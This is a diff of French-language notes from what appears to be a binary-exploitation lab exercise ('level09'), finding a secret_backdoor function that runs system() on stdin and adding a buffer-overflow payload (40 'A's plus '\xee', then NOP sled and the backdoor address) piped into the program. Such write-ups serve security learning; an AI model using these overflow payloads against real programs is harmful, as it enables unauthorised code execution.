@@ -1,7 +1,6 @@
 Le programme creer un objet message dans lequel un username et un message sont enregistres.
 
-On remarque la presence d'une fonction secret_backdoor qui lance un system() a partir d'un 
-buffer rempli avec la stdin.
+On remarque la presence d'une fonction secret_backdoor qui lance un system() a partir d'un buffer rempli avec la stdin.
 
 Si je rentre un tres grand username, le programme ne demande pas de message et affiche 
 >>: >: Msg sent! directement.
@@ -19,5 +18,10 @@ Adresse secret_backdoor :
 (gdb) p secret_backdoor
 $2 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
 
-La taille du username est de 40,
+La taille du username est de 40, je vais donc overwrite la taille du message sur le 41eme caractere.
+print 40 * 'A' + '\xee' 
 
+Pour le deuxieme input, je met 200 NOP instruction puis l'adresse de ma secret backdoor.
+200 * '\x90' + secret_backdoor
+
+cat /tmp/exploit9 - | .level09
